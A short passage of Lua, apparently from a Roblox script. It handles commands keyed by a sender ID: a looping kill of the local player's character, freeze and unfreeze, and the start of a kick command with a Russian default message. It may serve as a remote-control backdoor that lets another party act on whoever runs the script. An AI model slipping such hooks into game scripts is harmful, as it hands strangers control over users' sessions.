        if killLoops[senderId] then killLoops[senderId]:Disconnect() end
        killLoops[senderId] = RS.Heartbeat:Connect(function()
            local h = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
            if h then h.Health = 0 end
            task.wait(10)
        end)
        
    elseif cmd == "STOP_KILL_LOOP" then
        if killLoops[senderId] then
            killLoops[senderId]:Disconnect()
            killLoops[senderId] = nil
        end
        
    elseif cmd == "FREEZE_PLAYER" then
        if hum then
            hum.WalkSpeed = 0
            hum.JumpPower = 0
        end
        
    elseif cmd == "UNFREEZE_PLAYER" then
        if hum then
            hum.WalkSpeed = 16
            hum.JumpPower = 50
        end
        
    elseif cmd == "KICK_PLAYER" then
        local reason = data or "Вы кикнуты администратором"
        task.wait(0.5)
